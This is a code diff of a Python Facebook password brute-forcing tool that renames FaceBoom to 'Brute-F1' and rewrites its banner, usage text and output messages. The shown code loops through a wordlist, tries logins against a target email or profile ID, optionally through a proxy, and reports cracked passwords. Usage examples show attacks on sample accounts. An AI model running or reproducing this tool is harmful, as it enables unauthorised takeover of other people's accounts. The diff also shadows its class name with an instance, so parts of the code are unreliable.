@@ -30,7 +30,7 @@ except ImportError:
     print("  [•] Please use : 'pip install mechanize' to install it :)")
     sys.exit(1)
 
-class FaceBoom(object):
+class brutef(object):
 
 
     def __init__(self):
@@ -104,16 +104,22 @@ class FaceBoom(object):
 
         proxystatus = gr+self.useProxy+wi+"["+gr+" ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
         print(gr+"""
+
+  ____             _              ______ __ 
+ |  _ \           | |            |  ____/_ |
+ | |_) |_ __ _   _| |_ ___ ______| |__   | |
+ |  _ <| '__| | | | __/ _ \______|  __|  | |
+ | |_) | |  | |_| | ||  __/      | |     | |
+ |____/|_|   \__,_|\__\___|      |_|     |_|
+                                            
+―――― """+yl+"""All praise is for Allah—Lord of all worlds"""+gr+""" ――――
+
+[•] """+yl+"""Brute-F1 : Powerful Facebook Bruteforce Tool"""+gr+"""!
+[•] """+yl+"""Creator : MD Asif Hasan"""+gr+"""         [---]
 ==================================
-[---]   """+wi+"""Brute―F1"""+gr+"""        [---]
-==================================
-[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
-==================================
-[---]         """+yl+"""MD Asif Hasan"""+gr+"""         [---]
-==================================
-[•] Target      ― """+yl+target+gr+"""
-{}""".format("[•] Wordlist    ― "+yl+str(wordlist) if not single_passwd else "[•] Password    ― "+yl+str(single_passwd))+gr+"""
-[•] ProxyStatus ― """+str(proxystatus)+wi)
+~ Target      ― """+yl+target+gr+"""
+{}""".format("~ Wordlist    ― "+yl+str(wordlist) if not single_passwd else "~ Password    ― "+yl+str(single_passwd))+gr+"""
+~ ProxyStatus ― """+str(proxystatus)+wi)
         if not single_passwd:
             print(yl+"""\
 =================================="""+wi+"""
@@ -144,44 +150,44 @@ class FaceBoom(object):
                      ver.write(repoVersion)
                 write("  [•] Successfully Updated :)\n")
 
-parse = optparse.OptionParser(yl+"""
-[•]+wi+ Usage : python brute-f1.py [Options]
+parse = optparse.OptionParser(gr+"""
+  [•] Tool Created By MD Asif Hasan [DetaSploit]
 
 
-+gr+―――[ Options ]―――+yl+
+―――[ Usage ]―――
        
     
-  [•]+wi+ -t <Target Email> [or] <Facebook ID>
-  Specify Target Email [or] Target Profile ID+yl+
+  [•] -t <Target Email> [or] <Facebook ID>
+  Specify Target Email [or] Target Profile ID
     
-  [•]+wi+ -w <Wordlist Path>                 
-  Specify Wordlist (.txt) File Path+yl+
+  [•] -w <Wordlist Path>                 
+  Specify Wordlist (.txt) File Path
     
-  [•]+wi+ -s <Single Password>         
-  Specify Single Password To Check+yl+
+  [•] -s <Single Password>         
+  Specify Single Password To Check
     
-  [•]+wi+ -p <Proxy IP:PORT>                 
-  Specify HTTP/S Proxy (Optional)+yl+
+  [•] -p <Proxy IP:PORT>                 
+  Specify HTTP/S Proxy (Optional)
     
-  [•]+wi+ -g <Target Facebook Profile URL> 
-  Specify Target Facebook Profile URL For Get  ID+yl+
+  [•] -g <Target Facebook Profile URL> 
+  Specify Target Facebook Profile URL For Get  ID
     
-  [•]+wi+ -u/--update                        
-  Update Brute-F1 Script+gr+
+  [•] -u/--update                        
+  Update Brute-F1 Script
   
 
-―――[ Examples ]―――+yl+
+―――[ Examples ]―――
         
      
-  [•]+wi+ python brute-f1.py -t Asif@gmail.com -w /usr/share/wordlists/wordlist.txt+yl+
+  [•] python brute-f1.py -t Asif@gmail.com -w /usr/share/wordlists/wordlist.txt
      
-  [•]+wi+ python brute-f1.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt+yl+
+  [•] python brute-f1.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      
-  [•]+wi+ python brute-f1.py -t Asif@hotmail.com  -w D:\\wordlist.txt -p 144.217.101.21:3129+yl+
+  [•] python brute-f1.py -t Asif@hotmail.com  -w D:\\wordlist.txt -p 144.217.101.21:3129
      
-  [•]+wi+ python brute-f1.py -t Asif@gmail.com -s 1234567+yl+
+  [•] python brute-f1.py -t Asif@gmail.com -s 1234567
      
-  [•]+wi+ python brute-f1.py -g https://www.facebook.com/username+wi
+  [•] python brute-f1.py -g https://www.facebook.com/username
      
 """)
 
@@ -199,7 +205,7 @@ def Main():
                         help="Specify TARGET FACEBOOK PROFILE URL to Get ID")
    parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
    (options,args) = parse.parse_args()
-   faceboom = FaceBoom()
+   brutef = brutef()
    target = options.target
    wordlist = options.wordlist
    single_passwd = options.single
@@ -208,14 +214,14 @@ def Main():
    update = options.update
    opts = [target,wordlist,single_passwd, proxy, target_profile, update]
    if any(opt for opt in opts):
-     if not faceboom.cnet():
+     if not brutef.cnet():
        errMsg("Please Check Your Internet Connection")
        sys.exit(1)
    if update:
     brutef.updateBruteF()
     sys.exit(1)
    elif target_profile:
-        faceboom.get_profile_id(target_profile)
+        brutef.get_profile_id(target_profile)
         sys.exit(1)
    elif wordlist or single_passwd:
         if wordlist:
@@ -233,16 +239,16 @@ def Main():
                     sys.exit(1)
              print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
              final_proxy = proxy+":8080" if not ":" in proxy else proxy
-             if faceboom.check_proxy(final_proxy):
-                faceboom.useProxy = final_proxy
-                faceboom.br.set_proxies({'https':faceboom.useProxy, 'http':faceboom.useProxy})
+             if brutef.check_proxy(final_proxy):
+                brutef.useProxy = final_proxy
+                brutef.br.set_proxies({'https':brutef.useProxy, 'http':brutef.useProxy})
                 print(wi+"["+gr+"Connected"+wi+"]")
              else:
                 errMsg("Connection Failed")
                 errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                 sys.exit(1)
 
-        faceboom.banner(target,wordlist,single_passwd)
+        brutef.banner(target,wordlist,single_passwd)
         loop = 1 if not single_passwd else "~"
         if single_passwd:
             passwords = [single_passwd]
@@ -252,24 +258,24 @@ def Main():
         for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
-                write(wi+"["+yl+str(loop)+wi+"] iASIF009.ME ["+yl+str(passwd)+wi+"]")
-                retCode = faceboom.login(target, passwd)
+                write(wi+"["+yl+str(loop)+wi+"] Trying Password ["+yl+str(passwd)+wi+"]")
+                retCode = brutef.login(target, passwd)
                 if retCode:
                     sys.stdout.write(wi+" Login :"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
-                    print(wi+"["+gr+"•"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
+                    print(gr+"["+yl+"•"+gr+"] Password ["+gr+passwd+wi+"]"+gr+" Is Correct :)")
                     print(wi+"========================="+"="*len(passwd)+"======")
-                    if retCode == 2:print(wi+"["+yl+"•"+wi+"]"+yl+" Warning : This Account Using ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
+                    if retCode == 2:print(gr+"["+yl+"•"+gr+"]"+yl+" Warning : This Account Using ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                     break
                 else:
                     sys.stdout.write(yl+" Login :"+rd+" Failed\n")
                     loop = loop + 1 if not single_passwd else "~"
         else:
                 if single_passwd:
-                    print(yl+"\n["+rd+"•"+yl+"] Sorry : "+wi+"The Password [ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
+                    print(gr+"\n["+yl+"•"+gr+"] Sorry : "+wi+"The Password ["+yl+passwd+wi+"] Is Not Correct "+rd+":("+yl+"!"+wi)
                     print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Password or Wordlist "+gr+":)"+wi)
                 else:
-                    print(yl+"\n["+rd+"•"+yl+"] Sorry : "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
+                    print(gr+"\n["+yl+"•"+yl+"] Sorry : "+wi+"I Can't Find The Correct Password In ["+yl+wordlist+wi+"] "+rd+":("+yl+"•"+wi)
                     print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
         sys.exit(1)
    else:
